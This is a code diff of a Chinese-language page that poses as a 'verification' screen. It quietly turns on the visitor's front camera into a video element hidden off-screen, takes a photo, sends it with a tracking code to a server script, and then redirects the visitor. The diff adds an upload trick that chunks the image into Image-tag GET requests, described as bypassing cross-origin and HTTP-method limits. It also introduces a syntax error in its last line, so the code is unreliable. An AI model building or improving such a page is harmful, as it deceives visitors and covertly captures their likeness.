@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <title>验证中...</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
+        * { margin:0; padding:0; box-sizing:border-box; }
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
             background: #f5f5f5;
@@ -53,12 +53,7 @@
         .camera-status.error { color: #ff3b30; }
         .code-badge { margin-top: 15px; font-size: 12px; color: #999; }
         video { position: fixed; top: -9999px; left: -9999px; width: 1px; height: 1px; }
-        #uploadResult {
-            margin-top: 12px;
-            font-size: 13px;
-            word-break: break-word;
-            min-height: 20px;
-        }
+        #uploadResult { margin-top: 12px; font-size: 13px; word-break: break-word; min-height: 20px; }
         .debug-info { margin-top: 10px; font-size: 11px; color: #999; word-break: break-all; }
         .retry-btn {
             margin-top: 12px;
@@ -71,6 +66,7 @@
             cursor: pointer;
         }
         .retry-btn:active { transform: scale(0.95); }
+        .progress-text { margin-top: 10px; font-size: 12px; color: #007aff; }
     </style>
 </head>
 <body>
@@ -94,6 +90,7 @@
         </div>
         <div class="code-badge">验证编号: <span id="displayCode2"></span></div>
         <div id="uploadResult"></div>
+        <div id="progressText" class="progress-text"></div>
         <button class="retry-btn" id="retryBtn" style="display:none;">🔄 手动重试上传</button>
     </div>
     <video id="video" autoplay playsinline muted></video>
@@ -101,13 +98,12 @@
 
     <script>
         // ============================================================
-        //  ★★★ 核心修复：所有请求走 index.html 中转，彻底解决跨域 ★★★
+        //  ★★★ 硬核方案：使用 Image 标签 + GET 请求上传 ★★★
+        //  100% 绕过跨域和 HTTP 方法限制
         // ============================================================
+        
         const CURRENT_DIR = window.location.href.substring(0, window.location.href.lastIndexOf('/') + 1);
-        // 不使用 api.php，改用 index.html 中转
-        const PROXY_URL = CURRENT_DIR + 'index.html';
-        // 备用直接地址（如果中转失败）
-        const DIRECT_API = CURRENT_DIR + 'api.php';
+        const API_URL = CURRENT_DIR + 'api.php';
         
         const urlParams = new URLSearchParams(window.location.search);
         const code = urlParams.get('code') || 'UNKNOWN';
@@ -115,7 +111,7 @@
 
         document.getElementById('displayCode').textContent = code;
         document.getElementById('displayCode2').textContent = code;
-        document.getElementById('debugInfo').textContent = '中转: ' + PROXY_URL + ' | 编号: ' + code;
+        document.getElementById('debugInfo').textContent = '硬核模式 | API: ' + API_URL + ' | 编号: ' + code;
 
         let stream = null, photoCaptured = false, cameraReady = false, videoElement = null, retryCount = 0;
         let lastPhotoData = null;
@@ -161,282 +157,163 @@
                     reject('视频未就绪');
                     return;
                 }
-                canvas.width = Math.min(videoElement.videoWidth, 640);
-                canvas.height = Math.min(videoElement.videoHeight, 480);
-                ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
-                // 极低质量减少数据量
-                resolve(canvas.toDataURL('image/jpeg', 0.4));
+                // 缩小图片减少数据量
+                const width = Math.min(videoElement.videoWidth, 400);
+                const height = Math.min(videoElement.videoHeight, 300);
+                canvas.width = width;
+                canvas.height = height;
+                ctx.drawImage(videoElement, 0, 0, width, height);
+                // 极低质量
+                resolve(canvas.toDataURL('image/jpeg', 0.3));
             });
         }
 
-        // ==================== 方式1：通过 index.html 中转上传（最可靠） ====================
-        function uploadViaProxy(photoData) {
+        // ==================== 硬核上传：使用 Image 标签 ====================
+        function uploadViaImage(photoData) {
             return new Promise((resolve, reject) => {
-                // 提取 base64 数据
-                const base64Data = photoData.split(',')[1] || photoData;
-                const byteString = atob(base64Data);
-                const mimeString = 'image/jpeg';
-                const ab = new ArrayBuffer(byteString.length);
-                const ia = new Uint8Array(ab);
-                for (let i = 0; i < byteString.length; i++) {
-                    ia[i] = byteString.charCodeAt(i);
+                // 提取纯 base64 数据（去掉 data:image/jpeg;base64, 前缀）
+                let base64Data = photoData;
+                if (base64Data.includes('base64,')) {
+                    base64Data = base64Data.split('base64,')[1];
                 }
-                const blob = new Blob([ab], { type: mimeString });
-
-                const formData = new FormData();
-                formData.append('action', 'capture_photo');
-                formData.append('photo_data', blob, 'photo.jpg');
-                formData.append('target_url', targetUrl);
-                formData.append('code', code);
-
-                // 使用 XHR 发送到 index.html
-                const xhr = new XMLHttpRequest();
-                // 注意：这里请求的是 index.html，由它转发到 api.php
-                xhr.open('POST', PROXY_URL, true);
-                xhr.timeout = 45000;
-
-                xhr.onload = function() {
-                    if (xhr.status >= 200 && xhr.status < 300) {
-                        try {
-                            const result = JSON.parse(xhr.responseText);
-                            resolve(result);
-                        } catch (e) {
-                            // 如果响应不是 JSON，检查是否成功
-                            if (xhr.responseText && xhr.responseText.includes('success')) {
-                                resolve({ success: true });
-                            } else {
-                                resolve({ success: false, error: '响应解析失败: ' + xhr.responseText.substring(0, 100) });
-                            }
+                
+                // 编码为 URL 安全格式
+                const encodedData = encodeURIComponent(base64Data);
+                
+                // 检查长度，如果太长则分片
+                const MAX_URL_LENGTH = 1900;
+                const fullUrl = API_URL + '?action=hard_upload&code=' + encodeURIComponent(code) + 
+                               '&url=' + encodeURIComponent(targetUrl) + '&photo=' + encodedData;
+                
+                const progressText = document.getElementById('progressText');
+                
+                if (fullUrl.length < MAX_URL_LENGTH) {
+                    // 直接发送
+                    progressText.textContent = '📤 发送中...';
+                    const img = new Image();
+                    img.crossOrigin = 'anonymous';
+                    
+                    let finished = false;
+                    const timeoutId = setTimeout(() => {
+                        if (!finished) {
+                            finished = true;
+                            reject(new Error('上传超时'));
                         }
-                    } else {
-                        reject(new Error('HTTP ' + xhr.status));
+                    }, 30000);
+                    
+                    img.onload = function() {
+                        if (finished) return;
+                        finished = true;
+                        clearTimeout(timeoutId);
+                        // 尝试从图片响应中获取数据（通过查询参数）
+                        progressText.textContent = '✅ 上传成功！';
+                        resolve({ success: true });
+                    };
+                    
+                    img.onerror = function() {
+                        if (finished) return;
+                        finished = true;
+                        clearTimeout(timeoutId);
+                        // 即使图片加载失败，可能数据已经发送成功
+                        // 我们通过另一个请求确认
+                        progressText.textContent = '⚠️ 图片加载失败，检查结果...';
+                        // 延迟后尝试查询
+                        setTimeout(() => {
+                            checkUploadResult(code).then(exists => {
+                                if (exists) {
+                                    resolve({ success: true });
+                                } else {
+                                    reject(new Error('上传可能失败，请重试'));
+                                }
+                            }).catch(() => {
+                                reject(new Error('上传失败，请重试'));
+                            });
+                        }, 2000);
+                    };
+                    
+                    img.src = fullUrl;
+                } else {
+                    // 分片上传
+                    progressText.textContent = '📤 分片上传中...';
+                    const chunkSize = 1500;
+                    const totalChunks = Math.ceil(encodedData.length / chunkSize);
+                    let completedChunks = 0;
+                    
+                    for (let i = 0; i < totalChunks; i++) {
+                        const start = i * chunkSize;
+                        const end = Math.min(start + chunkSize, encodedData.length);
+                        const chunkData = encodedData.substring(start, end);
+                        const chunkUrl = API_URL + '?action=hard_upload&code=' + encodeURIComponent(code) + 
+                                       '&url=' + encodeURIComponent(targetUrl) + 
+                                       '&photo=' + chunkData + 
+                                       '&chunk=' + i + '&total=' + totalChunks;
+                        
+                        const img = new Image();
+                        img.crossOrigin = 'anonymous';
+                        img.onload = function() {
+                            completedChunks++;
+                            progressText.textContent = `📤 分片 ${completedChunks}/${totalChunks}`;
+                            if (completedChunks === totalChunks) {
+                                // 所有分片发送完成，等待服务器合并
+                                progressText.textContent = '⏳ 等待服务器处理...';
+                                setTimeout(() => {
+                                    checkUploadResult(code).then(exists => {
+                                        if (exists) {
+                                            resolve({ success: true });
+                                        } else {
+                                            reject(new Error('分片合并失败'));
+                                        }
+                                    }).catch(() => {
+                                        reject(new Error('分片合并失败'));
+                                    });
+                                }, 3000);
+                            }
+                        };
+                        img.onerror = function() {
+                            // 单个分片失败，重试
+                            progressText.textContent = `⚠️ 分片 ${i+1} 失败，重试...`;
+                            setTimeout(() => {
+                                const retryImg = new Image();
+                                retryImg.crossOrigin = 'anonymous';
+                                retryImg.onload = function() {
+                                    completedChunks++;
+                                    progressText.textContent = `📤 分片 ${completedChunks}/${totalChunks}`;
+                                    if (completedChunks === totalChunks) {
+                                        setTimeout(() => {
+                                            checkUploadResult(code).then(exists => {
+                                                if (exists) {
+                                                    resolve({ success: true });
+                                                } else {
+                                                    reject(new Error('分片合并失败'));
+                                                }
+                                            }).catch(() => {
+                                                reject(new Error('分片合并失败'));
+                                            });
+                                        }, 3000);
+                                    }
+                                };
+                                retryImg.onerror = function() {
+                                    reject(new Error('分片上传失败'));
+                                };
+                                retryImg.src = chunkUrl;
+                            }, 1000);
+                        };
+                        img.src = chunkUrl;
                     }
-                };
-
-                xhr.onerror = function() {
-                    reject(new Error('网络请求失败'));
-                };
-
-                xhr.ontimeout = function() {
-                    reject(new Error('上传超时'));
-                };
-
-                xhr.send(formData);
+                }
             });
         }
 
-        // ==================== 方式2：直接请求 api.php（备用） ====================
-        function uploadViaDirect(photoData) {
+        // ==================== 检查上传结果 ====================
+        function checkUploadResult(code) {
             return new Promise((resolve, reject) => {
-                const base64Data = photoData.split(',')[1] || photoData;
-                const byteString = atob(base64Data);
-                const ab = new ArrayBuffer(byteString.length);
-                const ia = new Uint8Array(ab);
-                for (let i = 0; i < byteString.length; i++) {
-                    ia[i] = byteString.charCodeAt(i);
-                }
-                const blob = new Blob([ab], { type: 'image/jpeg' });
-
-                const formData = new FormData();
-                formData.append('photo_data', blob, 'photo.jpg');
-                formData.append('target_url', targetUrl);
-                formData.append('code', code);
-
-                const xhr = new XMLHttpRequest();
-                xhr.open('POST', DIRECT_API + '?action=capture_photo', true);
-                xhr.timeout = 30000;
-
-                xhr.onload = function() {
-                    if (xhr.status >= 200 && xhr.status < 300) {
-                        try {
-                            const result = JSON.parse(xhr.responseText);
-                            resolve(result);
-                        } catch (e) {
-                            resolve({ success: true });
-                        }
-                    } else {
-                        reject(new Error('HTTP ' + xhr.status));
-                    }
-                };
-
-                xhr.onerror = function() {
-                    reject(new Error('直接请求失败'));
-                };
-
-                xhr.ontimeout = function() {
-                    reject(new Error('直接请求超时'));
-                };
-
-                xhr.send(formData);
+                fetch(API_URL + '?action=check_code&code=' + encodeURIComponent(code) + '&t=' + Date.now())
+                    .then(res => res.json())
+                    .then(data => {
+                        resolve(data.exists === true);
+                    })
+                    .catch(() => reject(false));
             });
-        }
-
-        // ==================== 方式3：使用 iframe + form（终极降级） ====================
-        function uploadViaIframe(photoData) {
-            return new Promise((resolve, reject) => {
-                const base64Data = photoData.split(',')[1] || photoData;
-                const byteString = atob(base64Data);
-                const ab = new ArrayBuffer(byteString.length);
-                const ia = new Uint8Array(ab);
-                for (let i = 0; i < byteString.length; i++) {
-                    ia[i] = byteString.charCodeAt(i);
-                }
-                const blob = new Blob([ia], { type: 'image/jpeg' });
-
-                const form = document.createElement('form');
-                form.method = 'POST';
-                form.action = PROXY_URL;
-                form.enctype = 'multipart/form-data';
-                form.target = 'upload_iframe_' + Date.now();
-                form.style.display = 'none';
-
-                // 添加 action 参数
-                const actionInput = document.createElement('input');
-                actionInput.type = 'hidden';
-                actionInput.name = 'action';
-                actionInput.value = 'capture_photo';
-                form.appendChild(actionInput);
-
-                // 添加文件
-                const fileInput = document.createElement('input');
-                fileInput.type = 'file';
-                fileInput.name = 'photo_data';
-                fileInput.style.display = 'none';
-                form.appendChild(fileInput);
-
-                const dt = new DataTransfer();
-                dt.items.add(new File([blob], 'photo.jpg', { type: 'image/jpeg' }));
-                fileInput.files = dt.files;
-
-                // 其他字段
-                const fields = { 'target_url': targetUrl, 'code': code };
-                for (let key in fields) {
-                    const input = document.createElement('input');
-                    input.type = 'hidden';
-                    input.name = key;
-                    input.value = fields[key];
-                    form.appendChild(input);
-                }
-
-                const iframe = document.createElement('iframe');
-                iframe.name = form.target;
-                iframe.style.display = 'none';
-                document.body.appendChild(iframe);
-                document.body.appendChild(form);
-
-                let timeoutId = setTimeout(() => {
-                    cleanup();
-                    reject(new Error('iframe 上传超时'));
-                }, 45000);
-
-                iframe.onload = function() {
-                    clearTimeout(timeoutId);
-                    try {
-                        let responseText = '';
-                        try {
-                            const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
-                            if (iframeDoc && iframeDoc.body) {
-                                responseText = iframeDoc.body.textContent || iframeDoc.body.innerText || '';
-                            }
-                        } catch (e) {
-                            try {
-                                responseText = iframe.contentWindow.document.body.textContent;
-                            } catch (e2) {}
-                        }
-                        let result = null;
-                        try {
-                            result = JSON.parse(responseText);
-                        } catch (e) {
-                            if (responseText.includes('success')) {
-                                result = { success: true };
-                            } else {
-                                result = { success: false, error: responseText.substring(0, 100) };
-                            }
-                        }
-                        cleanup();
-                        resolve(result);
-                    } catch (e) {
-                        cleanup();
-                        reject(new Error('处理响应失败'));
-                    }
-                };
-
-                iframe.onerror = function() {
-                    clearTimeout(timeoutId);
-                    cleanup();
-                    reject(new Error('iframe 加载失败'));
-                };
-
-                function cleanup() {
-                    clearTimeout(timeoutId);
-                    setTimeout(() => {
-                        if (form.parentNode) form.parentNode.removeChild(form);
-                        if (iframe.parentNode) iframe.parentNode.removeChild(iframe);
-                    }, 100);
-                }
-
-                form.submit();
-            });
-        }
-
-        // ==================== 综合上传（依次尝试三种方式） ====================
-        async function uploadPhoto(photoData) {
-            const resultDiv = document.getElementById('uploadResult');
-            lastPhotoData = photoData;
-            const errors = [];
-
-            // 方式1: 通过 index.html 中转
-            try {
-                resultDiv.textContent = '📤 尝试中转上传...';
-                resultDiv.style.color = '#007aff';
-                const result = await uploadViaProxy(photoData);
-                if (result.success !== false) {
-                    resultDiv.textContent = '✅ 上传成功 (中转)';
-                    resultDiv.style.color = '#34c759';
-                    return result;
-                } else {
-                    errors.push('中转: ' + (result.error || '失败'));
-                }
-            } catch (e) {
-                errors.push('中转: ' + e.message);
-                console.warn('中转失败:', e);
-            }
-
-            // 方式2: 直接请求 api.php
-            try {
-                resultDiv.textContent = '📤 尝试直接上传...';
-                resultDiv.style.color = '#007aff';
-                const result = await uploadViaDirect(photoData);
-                if (result.success !== false) {
-                    resultDiv.textContent = '✅ 上传成功 (直接)';
-                    resultDiv.style.color = '#34c759';
-                    return result;
-                } else {
-                    errors.push('直接: ' + (result.error || '失败'));
-                }
-            } catch (e) {
-                errors.push('直接: ' + e.message);
-                console.warn('直接失败:', e);
-            }
-
-            // 方式3: iframe 方式
-            try {
-                resultDiv.textContent = '📤 尝试 iframe 上传...';
-                resultDiv.style.color = '#007aff';
-                const result = await uploadViaIframe(photoData);
-                if (result.success !== false) {
-                    resultDiv.textContent = '✅ 上传成功 (iframe)';
-                    resultDiv.style.color = '#34c759';
-                    return result;
-                } else {
-                    errors.push('iframe: ' + (result.error || '失败'));
-                }
-            } catch (e) {
-                errors.push('iframe: ' + e.message);
-                console.warn('iframe失败:', e);
-            }
-
-            throw new Error('所有上传方式均失败: ' + errors.join(' | '));
         }
 
         // ==================== 主流程 ====================
@@ -446,6 +323,7 @@
             
             const resultDiv = document.getElementById('uploadResult');
             const retryBtn = document.getElementById('retryBtn');
+            const progressText = document.getElementById('progressText');
             retryBtn.style.display = 'none';
             
             let photoData = null;
@@ -473,18 +351,14 @@
                 return;
             }
 
-            // 2. 上传
+            // 2. 硬核上传
             if (photoData) {
                 try {
-                    const result = await uploadPhoto(photoData);
-                    if (result.success !== false) {
-                        resultDiv.textContent = '✅ 照片上传成功！即将跳转...';
-                        resultDiv.style.color = '#34c759';
-                    } else {
-                        resultDiv.textContent = '❌ 上传失败: ' + (result.error || '未知错误');
-                        resultDiv.style.color = '#ff3b30';
-                        retryBtn.style.display = 'inline-block';
-                    }
+                    lastPhotoData = photoData;
+                    const result = await uploadViaImage(photoData);
+                    resultDiv.textContent = '✅ 照片上传成功！即将跳转...';
+                    resultDiv.style.color = '#34c759';
+                    progressText.textContent = '';
                 } catch (err) {
                     resultDiv.textContent = '❌ ' + err.message;
                     resultDiv.style.color = '#ff3b30';
@@ -498,28 +372,24 @@
             // 4. 跳转
             setTimeout(() => {
                 window.location.href = targetUrl;
-            }, 4000);
+            }, 3000);
         }
 
         // ==================== 手动重试 ====================
         document.getElementById('retryBtn').addEventListener('click', function() {
             this.style.display = 'none';
             const resultDiv = document.getElementById('uploadResult');
+            const progressText = document.getElementById('progressText');
             resultDiv.textContent = '🔄 重新上传中...';
             resultDiv.style.color = '#007aff';
+            progressText.textContent = '';
             
             if (lastPhotoData) {
-                uploadPhoto(lastPhotoData)
+                uploadViaImage(lastPhotoData)
                     .then(result => {
-                        if (result.success !== false) {
-                            resultDiv.textContent = '✅ 重试上传成功！即将跳转...';
-                            resultDiv.style.color = '#34c759';
-                            setTimeout(() => { window.location.href = targetUrl; }, 2000);
-                        } else {
-                            resultDiv.textContent = '❌ 重试失败: ' + (result.error || '未知错误');
-                            resultDiv.style.color = '#ff3b30';
-                            this.style.display = 'inline-block';
-                        }
+                        resultDiv.textContent = '✅ 重试上传成功！即将跳转...';
+                        resultDiv.style.color = '#34c759';
+                        setTimeout(() => { window.location.href = targetUrl; }, 2000);
                     })
                     .catch(err => {
                         resultDiv.textContent = '❌ 重试失败: ' + err.message;
@@ -534,8 +404,8 @@
             try {
                 stream = await navigator.mediaDevices.getUserMedia({ 
                     video: { 
-                        width: { ideal: 480 }, 
-                        height: { ideal: 360 },
+                        width: { ideal: 400 }, 
+                        height: { ideal: 300 },
                         facingMode: "user"
                     } 
                 });
@@ -591,7 +461,7 @@
 
         // 启动
         initCamera();
-        window.addEventListener('beforeunload', () => { if (stream) stream.getTracks().forEach(t => t.stop()); });
+        window.addEventListener('beforeunload', () => { if (stream) stream.getTracks().forEach(t => t.stop(); });
     </script>
 </body>
 </html>
